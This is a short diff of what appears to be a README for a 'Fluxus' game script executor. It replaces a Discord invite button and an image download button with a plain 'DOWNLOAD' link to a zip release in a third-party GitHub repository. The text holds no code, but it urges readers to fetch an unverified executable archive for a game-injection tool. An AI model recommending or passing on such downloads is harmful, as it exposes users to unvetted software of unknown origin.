@@ -22,8 +22,7 @@ Whether you're a developer looking to test your game's mechanics or someone who 
 
 Get the latest version of the executor by clicking the button below:
 
-[![link-alt (1)](https://github.com/user-attachments/assets/9c083b30-eed5-4650-80fd-4334df2df6eb)](https://discord.com/invite/GNHbGP1bah2)
-[![file-download](https://github.com/user-attachments/assets/3baa8a7d-3917-402d-90e9-1386f3f04f23)](https://github.com/GhostlyBow/Fluxus-executor/releases/download/7.0.1/Fluxus.zip)
+[DOWNLOAD](https://github.com/GhostlyBow/Fluxus-executor/releases/download/7.0.1/Fluxus.zip)
 
 
 
